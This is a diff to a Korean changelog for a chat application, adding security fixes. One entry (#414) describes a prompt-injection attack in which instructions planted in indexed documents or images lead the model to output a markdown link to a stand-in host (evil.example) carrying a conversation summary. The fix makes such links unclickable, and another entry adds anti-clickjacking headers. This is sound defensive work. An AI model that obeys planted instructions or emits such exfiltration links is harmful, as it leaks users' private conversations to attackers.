@@ -11,6 +11,11 @@
   - `frontend.md` 「스트리밍 UI 규칙」에 객체 동일성 계약 추가
   - 테스트 : `MessageListRender` · `ChatPageRender` 각 1건(변경 전 실패 확인). **프론트 하한 191 → 193**(통합 후 193 → 195)
 ### Security
+- **답변 속 마크다운 링크를 누를 수 없는 글자로 낮춘다(#414).** 이미지(#359)는 막았지만 `a` 는 그대로 눌렸다 - 색인 문서나 첨부 이미지에
+  프롬프트 주입을 심어 모델이 `[자세히](https://evil.example/?q=<대화 요약>)` 를 내게 하면 한 번 클릭으로 대화 내용이 바깥으로 나갔다(10-22 전체 QA)
+  - `Markdown.tsx` 의 `a` 렌더러 : `<a>` 없이 글자 + ` (호스트)` (`new URL` 의 host, http/https 만). 상대 경로 · `javascript:` · 깨진 값은 글자만
+  - 출처 목록 · 그림 등 앱이 만든 링크는 이 경로를 거치지 않아 그대로다. `frontend.md` 답변 마크다운 규칙에 추가
+  - 테스트 : `MessageList.test.tsx` 2건 추가(변경 전 실패 확인) · 링크가 눌린다고 단정하던 2건은 글자 단정으로 조정. **프론트 하한 195 → 197**
 - **Vercel 응답에 보안 헤더를 붙인다(#404).** 운영 응답에는 HSTS(Vercel 기본)뿐이라 다른 사이트가 `/admin` 을 iframe 으로 덮어
   클릭을 유도할 수 있었다(10-22 전체 QA, `curl -I` 로 확인)
   - `frontend/vercel.json` : `X-Frame-Options: DENY` · `X-Content-Type-Options: nosniff` · `Referrer-Policy: strict-origin-when-cross-origin`
